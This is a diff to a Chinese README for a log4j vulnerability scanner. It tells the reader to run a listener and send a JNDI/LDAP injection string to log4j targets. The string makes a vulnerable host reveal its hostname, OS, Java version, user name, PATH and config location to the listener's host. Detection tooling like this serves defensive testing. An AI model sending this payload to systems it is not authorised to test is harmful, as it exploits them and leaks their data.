@@ -31,16 +31,21 @@
 
 ## 用法
 
-1. 找一台服务器，搭建```LogXj安全服务端```, 命令如下:
+1. 找一台所有内网服务器都通的服务器，搭建```LogXj安全服务端```，命令如下：
 ```
 python logxj.py
 ```
 
-2. 以下是我构造的```LOGXJ POC```，需要先手动把里面的```LOGXJ_SERVER```替换为```LogXj安全服务端的IP```，然后把它发送给使用了log4j的目标: 
+2. 以下是我构造的```LOGXJ POC```，需要先手动把里面的```LOGXJ_SERVER```替换为```LogXj安全服务端的IP```，然后把它发送给使用了log4j的目标：
 ```shell
 ${jndi:ldap://LOGXJ_SERVER:4444/\nFound Log4j vuln!\nDate\t:${date:yyyy-MM-dd HH:mm:ss}\nHostname:${hostName}\nConf dir:${log4j:configLocation:-}\nOs ver\t:${java:os}\nJava ver:${java:version}\nUser\t:${env:USER:-}${env:USERNAME:-}\nIsTomcat:${env:CATALINA_BASE:-False}\nPATH\t:${env:PATH:-}\n\nEnd}
 ```
 
-3. 此时观察```LogXj安全服务端```的控制台:
-- 若收到请求, 则说明目标存在log4j漏洞.
-- 若无, 则说明可能暂无风险. 并且可以进一步代码审计确认是否真的无风险.
+3. 此时观察```LogXj安全服务端```的控制台：
+- 若收到回显，则说明目标或数据传输链路中的某些系统存在log4j漏洞。
+- 若没有回显，则说明可能暂无风险，也可能是和下面的```额外说明```有关。
+
+## 额外说明
+
+- 若dnslog的方式能发现log4j漏洞，但是用本项目的方式发现不到，则可能是因为```存在log4j漏洞的系统```与DNS服务器网络相通，且```存在log4j漏洞的系统```与```LogXj安全服务端```网络不通。
+- 建议把```LogXj安全服务端```部署在一台所有内网服务器都通的服务器上。
